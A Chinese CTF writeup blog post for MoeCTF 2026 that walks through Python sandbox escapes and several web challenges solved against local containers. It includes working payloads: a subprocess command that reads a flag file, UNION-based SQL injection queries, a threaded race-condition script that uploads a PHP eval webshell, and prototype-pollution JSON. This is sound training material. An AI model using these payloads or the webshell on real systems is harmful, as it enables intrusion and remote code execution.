---
title: "MoeCTF 2026 Writeup"
published: 2026-10-15
description: "MoeCTF 2026 部分题目的解题记录：Python 沙箱逃逸、开发与运维基础、Web 安全与渗透测试。"
tags: ["CTF", "MoeCTF", "Writeup", "Web安全", "沙箱逃逸"]
category: "CTF"
draft: false
---

> **关于本文**
>
> 由于神秘原因，导致后半程才开始写 Writeup，目前仅有部分题目写了 WP。
>
> 等最近的事情忙完了应该会补上一些其他题目的 WP。
>
> 由于博客暂时还没有选好稳定的图床，暂时无法在 WP 中加入图片（

## Python 沙箱逃逸

### mathmagic

> 随机的 jail，能随机的关住人吗？

```python
import time

class Random:
    _P = 1000000021
    _A = 320560990
    _BASE = 123456789 % _P
    def __init__(self, seed=0):
        self.state = (self._BASE * pow(self._A, seed % 60, self._P)) % self._P

    def random(self, mod):
        self.state = (self.state * self._A) % self._P
        return self.state % mod + 1

def chall():
    MOD = 15
    seed = int(time.time())
    r = Random(seed)
    gift = [r.random(MOD) for _ in range(3)]
    print("Wlecome to the word of mathmagic!")
    print("I hope you like the puzzle I prepared for you.")
    print('I will give you a gift!')
    print('I hope you like it. Here is your gift:')
    print(gift)
    print("Now, I will give you the puzzle!")
    print("Have fun!")
    CODE = ''

    while code:=input('>> ').strip():
        if len(code) != r.random(MOD):
            raise ValueError("Invalid code length! You are not a genius!")
        CODE += code + '\n'
    print("Good job! You are a genius!")
    eval(CODE,{'__builtins__': {}})
```

### only_open

> starwalking，你别躲在里面不出声，我知道你在 open，你有本事 open，怎么没本事 read 哪。read 呐，你有本事 open，你有本事 read 呐，read，read，快 read，starwalking 快 read，别躲里面不出声，我知道你在 open。
>
> 友情提示：flag 在 `/tmp/flag`

先看代码，分析防御手段：

```python
def chall():
    safe_globals={
        'open':open,
        '__builtins__' : {}
    }

    blacklist = ['_','.','\\']
    while True:
        try:
            message = input('Give me your code: ').encode('ascii').decode('ascii')
            if any(b in blacklist for b in message):
                raise RuntimeError('Can\'t input any characters in blacklist')
            eval(message,safe_globals)
        except Exception as e:
            print(f'{type(e).__name__} : {e}')
```

首先是置空 `__builtins__`，这意味着几乎所有的内置函数都无法直接使用，注意到其还保留了一个缺口 `open`，如果只是这样的话只需要访问 `open.__globals__['__builtins__']` 即可拿回正常环境中的内置模块。然而下面黑名单中展示了 `_`，则无法直接使用 `__builtins__` 等类似的魔法属性，而屏蔽了 `\`，这使得无法通过 `\x5f` 或者 `\137` 转义动态生成 `_` 来绕过黑名单。对于 `.` 的屏蔽是防止直接使用 `open("/tmp/flag").read()`，因为这个显然不属于 CTF 考点。而 `.encode('ascii').decode('ascii')` 是防止通过 **Unicode 混淆攻击**来绕过屏蔽字符（见题目 *3z_ban_jail*）

缺口 `open` 一定是本题关键，不然直接置空 `__builtins__` 即可，有什么办法可以得到 `open` 的返回呢？

`open` 是一个可迭代对象，想要获取文件内容，除了使用 `read()` 以外还可以对其进行**解构**，我们可以使用数组来承载解构后的结果（元组、集合亦可，但要注意的是用元组承载时要额外加一个逗号来向解释器说明这是元组而不是分组表达式用的圆括号 `(*open("/tmp/flag"),)`），即 `[*open("/tmp/flag")]`。

由于 `eval()` 不会直接输出表达式的值，所以我们要让数组显示出来得寻找别的方法。正常的输出函数由于 `__builtins__` 的置空已经失效，但是我们可以从"非正常（abnormal）"角度来思考，$abnormal=error$，所以我们想到通过**错误回显**的方式来输出（doge）。（其实是从代码中存在主动捕获错误（`try...except...`）的处理可以发现错误回显的思路）

常见的错误回显方式如构造**空字典**然后使用 `[key]` 访问里面的内容，显然不可能访问到，于是会报错 `KeyError`，在回显中会显示 `key` 的值，我们只要用格式化字符串 `f"{[*open("/tmp/flag")]}"` 来将数组强制转化为字符串来作为 `key` 即可得到数组内容也即文件内容。注意这边并**不能**构造数组，因为数组传入字符串索引会报的 `TypeError: list indices must be integers or slices, not str` 是不会回显具体索引的。

### Equals

> 听说你数学很好，试试让等式成立？

题目的判定标准是，对于 `code` 需满足 $\sum ord(c) = len^2(code), c \in code$。由于等式右边初始值过小，左边对于可见字符而言最小也是 `32`，所以输入比较短的代码基本上无法满足。但是注意到左边是近似线性增长，右边是幂增长，所以当代码长度增加时右边最后会超过左边。想到让代码增长但又不影响其功能，首先想到就是注释 `#`，我们只需要构造出一个后面缀有特定字符作为注释的 Payload 即可。

接下来推导构建方法，这里涉及到简单的初中数学知识。假设对于原来的代码设为 $code$，其中的字符设为 $c$，下一步要新增的字符设为 $n$：

$$
\begin{aligned}
\sum ord(c)+ord(n)&=(len(code)+1)^2 \\
ord(n)&=len^2(code)+2len(code)+1-\sum ord(c)
\end{aligned}
$$

也就是说我们只要让下一个添加的字符的 ascii 码尽可能接近我们当前整个代码的那一大串值（上式中等号右侧）即可。由于在前面很长一段的里面等号右边的值都是负数，所以我们只需要添加尽可能小的字符，也就是空格，其 ascii 为 `32`。由于右侧是幂增长，一旦超过左侧就无法被赶上了，所以当我们右侧第一次或者第二次大于 0 的时候大概率就是为数不多可能存在一个可见字符 $n$ 满足等式的情况了（第一次大于零的时候可能小于 32，这时需要看第二次），这时候只需找到对应 $n$ 即可。**需要注意的是如果原 Payload 过长有可能出现无法构造的情况**。

对以下 Payload 进行构造：

```python
print(__import__("subprocess").run("cat /tmp/flag",shell=True,stdout=True).stdout)
```

在添加了 `#` 与五个空格后设等式右边为 $t$，此时 $t=100$，满足关系式 $32\leq t\leq 126$。则 $n=chr(t)$，n 取 `'d'`。

最终得到的 Payload 如下：

```python
print(__import__("subprocess").run("cat /tmp/flag",shell=True,stdout=True).stdout)#     d
```

## 开发与运维基础

### 碎片风暴

> 服务器突然涌入了大量的并发请求！而且每个请求体里，都只带了一小段零碎的字符串。
>
> 运维人员抓包后发现，这些字符串似乎是某个重要机密（Flag）的碎片。它们没有序号、没有偏移量，顺序完全是乱的。
>
> 你能写一个高性能的服务，接住这些高并发请求，并把完整的 Flag 拼凑出来吗？

首先先要确认请求的格式，通过以下 Python 代码：

```bash
python3 -c "import socket; s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(('0.0.0.0', 3000)); s.settimeout(3); s.listen(1); c,a=s.accept(); print(c.recv(4096).decode(errors='ignore')); c.close(); s.close()"
```

可以捕获其中一个"碎片"：

```
POST / HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Go-http-client/1.1
Content-Length: 4
Content-Type: text/plain
Accept-Encoding: gzip

n_Bu
```

可以知道是标准的 POST 请求，于是编写 Python 代码进行简单的捕获，然后再用题目附件给的 SCS 求解函数进行拼接，最终得到 flag。（<s>当然理论上用该 Python 代码提交 n 次也可以得到完整的 flag</s>）

```python
import asyncio

frags = set()
lock = asyncio.Lock()

def solve_scs(fragments: list[str]) -> tuple[str, bool]:
    """
    Shortest Common Superstring solver.

    Args:
        fragments: 碎片列表（可含重复）
    Returns:
        (result, is_success)
        - result: 还原后的字符串
        - is_success: True = 贪心结果唯一可信；False = 存在歧义或碎片不连续
    """

    from itertools import permutations

    # 1. 去重 + 去冗余（被其他片段包含的直接丢弃）
    frags = list(dict.fromkeys(fragments))           # 去重，保序
    frags = [
        f for f in frags
        if not any(f in g for g in frags if g != f)
    ]

    if not frags:
        return ("", False)
    if len(frags) == 1:
        return (frags[0], True)

    def max_overlap(a: str, b: str) -> int:
        """a 的后缀与 b 的前缀的最大重叠长度"""
        limit = min(len(a), len(b))
        for ol in range(limit, 0, -1):
            if a.endswith(b[:ol]):
                return ol
        return 0

    def greedy_merge(pool: list[str]) -> str:
        """贪心：每轮合并重叠最大的一对"""
        pool = pool[:]
        while len(pool) > 1:
            best_ol, bi, bj = -1, 0, 1
            for i in range(len(pool)):
                for j in range(len(pool)):
                    if i == j:
                        continue
                    ol = max_overlap(pool[i], pool[j])
                    if ol > best_ol:
                        best_ol, bi, bj = ol, i, j
            merged = pool[bi] + pool[bj][best_ol:]
            pool = [merged] + [pool[k] for k in range(len(pool)) if k not in (bi, bj)]
        return pool[0]

    # 2. 片段数量少时用暴力
    #    片段数量多时用贪心
    EXACT_THRESHOLD = 8

    if len(frags) <= EXACT_THRESHOLD:
        # 枚举所有排列，找真正最短的公共超串
        best: str | None = None
        for perm in permutations(frags):
            # 按排列顺序依次合并
            cur = perm[0]
            for nxt in perm[1:]:
                ol = max_overlap(cur, nxt)
                cur += nxt[ol:]
            if best is None or len(cur) < len(best):
                best = cur

        # 检查贪心结果是否与精确结果一致
        greedy_result = greedy_merge(frags)
        is_success = (greedy_result == best)
        return (best, is_success)     # type: ignore[return-value]

    else:
        # 片段太多，只跑贪心
        result = greedy_merge(frags)
        is_success = all(f in result for f in frags)
        return (result, is_success)

async def handle(reader, writer):
    data = await reader.readuntil(b'\r\n\r\n')
    text = data.decode('utf-8')

    content_length = 0
    for line in text.split('\r\n'):
        if line.startswith('Content-Length:'):
            content_length = int(line.split(':')[1].strip())
            break
    try:
        body = await reader.readexactly(content_length) if content_length > 0 else b''
    except Exception as e:
        print(f'Error reading request: {e}')
        writer.close()
        await writer.wait_closed()
        return

    async with lock:    # 注意这里要加锁
        frags.add(body.decode('utf-8'))
        res = solve_scs(list(frags))
        if res[0].startswith('moectf{') and res[0].endswith('}'):
            print(f'Found the flag: {r·es[0]}')

    writer.write(b'HTTP/1.1 200 OK\r\n\r\n')
    await writer.drain()
    writer.close()
    await writer.wait_closed()

async def main():
    server = await asyncio.start_server(handle, '0.0.0.0', 3000)
    print('Server running on http://0.0.0.0:3000')
    await server.serve_forever()

asyncio.run(main())
```

得到 flag 为 `moectf{BY-us1NG-IANGU4g35-We_c@n_BuILD_V4rI0US_pIATF0rms-and-applications0}`。

需要注意的是这里有一个高并发下的锁处理，避免多线程同时修改 `frags` 时造成**数据竞争**。另外本程序为一次性程序，不是很健壮，且在拿到 flag 以后没有判定 `is_success == True` 后退出，仍然会继续运行造成 flag 刷屏，<s>Ctrl + C 即可</s>。

## Web 安全与渗透测试

### 查分系统

下载静态的 `system.html` 打开源代码，`Ctrl + F` 查询 `moectf` 即可得到 flag。

### 归途

先看控制台，我们发现了 `Key1-N2ghNUkkTQ==`，base64 解码后发现这是 `7h!5I$M`，推测是 flag 的一部分。继续审计源码，发现了一行注释：

```html
<!-- Key2-QDBtNG9k -->
```

解码后为 `@0m4od`，而后又在网络请求中发现了 key3（注意这一步审计源码也可以得到）：

```javascript
async function pollKey() {
	try {
		const res = await fetch("/getKey?id=3", { cache: "no-store" });
		const data = await res.json();
	} catch (error) {
		document.getElementById("api-status").textContent = "Request failed";
	}
}
```

```json
{
    "key": "Key3-M0szeUVuKw==",
    "message": "Do you know url params? Try to get Key4"
}
```

这里的 `url params` 指的是 url 后面所带的参数，其格式为 `?param1=value1&&param2=value2...`，省略号表示可以有多个类似结构的参数。观察这个 GET 方法，我们可以看到其传了一个 `id=3` 从而得到了 key3，那么 key4 显然就是 `id=4` 咯，尝试 GET key4（这一步可以在浏览器中直接输入网址进行，也可以在工具中进行）：

```json
{
  "key": "Key4-ZXJUaDFzbGE=",
  "message": "Do you know HTTP headers? Check it. Besides, Try to POST this api"
}
```

这里让我们 check 一下 `HTTP headers`，即查看一下返回的请求头：

```http
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.12.13
Date: Tue, 13 Oct 2026 05:57:14 GMT
Content-Type: application/json; charset=utf-8
key: Key5-ITkzdA==
Content-Length: 108
```

下一步是 POST 刚刚那个 api：

```json
{
  "key": "Key6-ZnwxbGFA",
  "message": "Try login!"
}
```

再下一步是尝试登录，由于没有给具体的登录方式，猜测直接构造 url `/login` 来进入登录，给出了账号与密码直接登录，登录后提示：

```plain
Do you know cookie(不能吃)? Try to login the account of "admin"
```

在 cookie 中发现了一个 `user:guest`，修改为 `user:admin` 即可进入下一步：

```plain
Key7-NGFAZzY5Nmc5
有一个文件限制了爬虫可以访问的内容，是什么呢？
All Key body are a b64 string, try to decode
```

凭借常识可知题目说的是 `/robots.txt`，访问后得到一个路径 `/f13ggggg`，访问后输入最终解码的内容：

```plain
Key1   N2ghNUkkTQ==   7h!5I$M
Key2   QDBtNG9k       @0m4od
Key3   M0szeUVuKw==   3K3yEn+
Key4   ZXJUaDFzbGE=   erTh1sla
Key5   ITkzdA==       !93t
Key6   ZnwxbGFA       f|1la@
Key7   NGFAZzY5Nmc5   4a@g696g9

7h!5I$M@0m4od3K3yEn+erTh1sla!93tf|1la@4a@g696g9
```

便可以得到最终的 flag。

### 当零来敲门

> 快来和群友（并不是）一起玩快乐的数字接龙！只要大家齐心协力从 1 数到 500，出题人就把 Flag 白送给你！
>
> 诶等等，怎么聊天室里混进来了一个…… 这个「林林」是个无情的刷屏复读机，每过 10 秒钟就必须看到一次 0。只要它发了 0，大家刚刚数出来的进度就当场重置归零！

显然靠手速在 10 秒内打完 500 次是不现实的，考虑 Python 脚本自动进行报数。

先尝试报数 1，即可在浏览器 Devtools 的 `Network` 中找到是向 `/chat` 发送了一个 POST 请求，请求的表单包括用户名和消息。连接上 SSH 后在交互式 Python 中使用以下代码即可。

```python
import requests
url = "http://127.0.0.1:8080/chat"
for i in range(500):
	data = {"user": "cck", "msg": i+1}
	res = requests.post(url, json = data)
	print(res.status_code)
```

### MoeCatchTheFrogs

> MoeCTF 2026 官方群已经被绿色青蛙占领！！🐸🐸🐸
>
> 传说抓住所有的九种青蛙，就可以获得一份神秘礼物……

点击抓青蛙后发现 `cookie` 中多了一个 `frog_session`，看样式应该是 flask-session，使用 flask-unsign 即可爆破出弱口令 `qwe123456`，然后构造出 `{'frogs':[0,1,2,3,4,5,6,7,8,9]}` 的对应 session，修改本地后刷新网页即可。

注意这个口令貌似在 flask-unsign 默认词典里没有，需要换个体量更大的 wordlist。

### 古籍翻阅

容器打开后是一大堆的古籍，随便点击几本进去都是 `404 - 此卷散佚`，联系题目名字我们应该要找到一个特殊的古籍，而题目给了所有古籍的目录，我们可以写一个简单的 python 脚本来处理这个目录，从中找到突破口：

```python
with open("guji_catalog.txt", "r") as f:
    content = sorted(f.readlines())
    for line in content:
        print(line.strip())
```

在输出的 s 和 z 开头的文件之间我们可以看到一个与众不同的文件名字 `true_file`：

```plain
...
shi/tongjian/www
true_file
zi/laozi/admin
...
```

推测这是下一步的突破口，我们在 html 源码中搜寻该文件名得到：

```html
<a class="scroll-link" href="[/read?book=true_file](http://127.0.0.1:51569/read?book=true_file)"><span class="seal">0737</span><span class="title">无名真卷</span><span class="meta">孤本</span></a>
```

点进去后得到了提示：

> 其实 flag 藏在了根目录下，去看看根目录吧

这里尝试了 `/flag` , `/read?book=/flag`，`/read?book=flag` 等都是无果的。后来盯着目录文件看了半天突然发现这很像是文件结构，考虑存在路径穿越漏洞，于是尝试 `/read?book=../../` 成功得到 flag：`moectf{re@d_the_r00t_5utr4_w1th_path_tr4v3r5@l}`。从 flag 可以看出路径穿越确实是该题预期知识点。

### 河湖小盗

打开界面非常简洁的一个网信院往年试题检索系统，很明显要使用 sql 注入。

首先尝试输入 `1`，可以看到返回了序号为 1 的登记人的信息，尝试输入 `1 or 1=1`，发现全部 5 条信息都出现了，说明是数字型注入，上下文内不存在引号且查询参数后面没有任何内容。观察表格有三列，猜测查询内容有三列，尝试使用联合注入 `1 union select 1,2,3`，成功将 `1,2,3` 带到了返回的结果里来。

通过特征函数 `version()` 与 `sqlite_version()` 可以判断出数据库是 MySQL 8.0.46，则使用 MySQL 的方法查表名列名等：

```sql
1 union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()
1 union select group_concat(column_name),2,3 from information_schema.columns where table_name="flag_table"
1 union select flag,2,3 from flag_table where id=1
```

最终可以得到 flag：`moectf{h3re_i5_your_7e$7_pap3r}`。

### 我刚一提交就发现了三个问题

> 我在你们这才交了几个文件，我已经发现三个问题了：
>
> 首先，（啪啪啪），在线提交，这文件怎么进了你的私人的目录里呢？
>
> 第二，这个文件我刚传进去，我还没拿到 flag 呢，这已经被删了，诶，这说明你们的后端逻辑有问题啊
>
> 第三，这个木马已经被我传上去了，这位邪恶的出题人，你怎么不给我 flag 呢？那请问我怎么才能解题呢？
>
> （尝试提交内容为题目描述的文本文件会有惊喜，不包含括号内容，注意消除行间空格）

首先分析题目，通过提交文件可知这应该是一道文件上传漏洞题目。由题目第二点可知后端有对上传的文件进行校验，剩下两点看不出有什么作用。

连接上 wsrx 后对网页进行观察，尝试随便上传一个文件 `1.txt`，发现会有回显上传路径为 `/private/1.txt`，访问后可以看到文件内容。尝试编辑一句话木马 `<?php @eval($_POST[\"cmd\"]); ?>` 并上传，发现正常显示上传路径，但是访问时出现 `404`。说明未通过服务器校验后被删除文件。此外还进行了其他尝试如改后缀名为 `php3`、`php5` 等，将 PHP 代码通过 `txt` 格式上传等，均会出现 `404`，推测后端校验会校验内容，于是另找方向突破。

从正常显示上传路径可猜测服务器大概率是先保存文件再进行校验文件的，中间可能存在允许访问文件的窗口，联想到**竞态条件漏洞**。我们可以通过多线程上传文件与访问文件，使得上传的文件在还未校验删除的窗口期被触发，从而植入不会被校验的木马文件，再访问木马文件即可。

```python
import requests
import threading
import time

BASE_URL = "http://127.0.0.1:1883"
SEND_PATH = "/submit"
GET_PATH = "/private/a.php"
THREAD_COUNT = 20

PAYLOAD = "<?php file_put_contents('ckk.php', '<?php @eval($_POST[\"cmd\"]); ?>'); echo 'Mamba out!'; ?>"
files = {'file': ('a.php', PAYLOAD, 'application/x-php')}

stop_event = threading.Event()

def send_payload():
    while not stop_event.is_set():
        try:
            response = requests.post(BASE_URL + SEND_PATH, files=files, timeout=1)
            time.sleep(0.01)
        except Exception as e:
            pass

def get_shell():
    while not stop_event.is_set():
        try:
            res = requests.get(BASE_URL + GET_PATH, timeout=1)
            if res.status_code == 200 and "Mamba out!" in res.text:
                print("Shell obtained!")
                stop_event.set()
                return
            else:
                pass
        except Exception as e:
            pass
        time.sleep(0.01)

if __name__ == "__main__":
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=send_payload)
        threads.append(t)
        t.start()

    get_shell()

    for t in threads:
        t.join(timeout = 1)

    print("All threads have finished.")
```

运行后等待输出 `Shell obstained!`，然后访问 `/private/ckk.php`，界面空白，在开发者工具中网络选项卡看到状态码为 `200`，则注入成功。而后用蚁剑连接，在根目录下的 `flag` 文件中得到 flag：`moectf{h0t_$0y_m!1k_ha5_n0_$+raw}`。

### 合乎周礼 & 礼崩乐坏

同一系列的题，通过访问 `/api/help` 得到以下信息：

```json
{
  "name": "配置中心",
  "routes": {
    "GET /": "题目描述",
    "GET /api/me": "查看当前用户的配置",
    "POST /api/profile": "提交 JSON 配置",
    "GET /api/flag": "只有审核 isAdmin=true 且 canReadFlag=true 时返回 FLAG"
  }
}
```

访问 `/api/me` 得到以下信息：

```json
{
  "ok": true,
  "profile": {
    "profile": {
      "nickname": "guest"
    },
    "theme": {
      "color": "blue"
    }
  },
  "inheritedProbe": {
    "isAdmin": null,
    "canReadFlag": null
  }
}
```

可知我们需要做的事情就是让 `inheritedProbe` 下的两个属性全部都变为 `true`。尝试 POST `/api/profile` 并上传 JSON 可以发现上传的东西会被解析添加到 `profile` 下，无法直接修改我们要的 `inheritedProbe`。这种隔空影响属性的要求能够联想到**原型链污染**。

前者不存在 WAF，所以直接用最简单的方式即可：

```json
{
  "profile": {
    "__proto__": {
      "isAdmin": true,
      "canReadFlag": true
    }
  }
}
```

后者存在 WAF，禁止嵌套对象，否则会返回 "**配置值仅允许布尔值、数字、短字符串或 null**"，那后端有可能采用的是类似"**点号路径赋值**"的函数，能够传入扁平键值对。尝试构造 `__proto__.isAdmin`，发现如果遇到 `__proto__` 会返回 "**此举不合礼制**"。经过尝试后发现出题人没有屏蔽 `constructor`，构造以下 JSON 即可：

```json
{
  "profile": {
    "constructor.prototype.isAdmin": true,
	"constructor.prototype.canReadFlag": true
  }
}
```
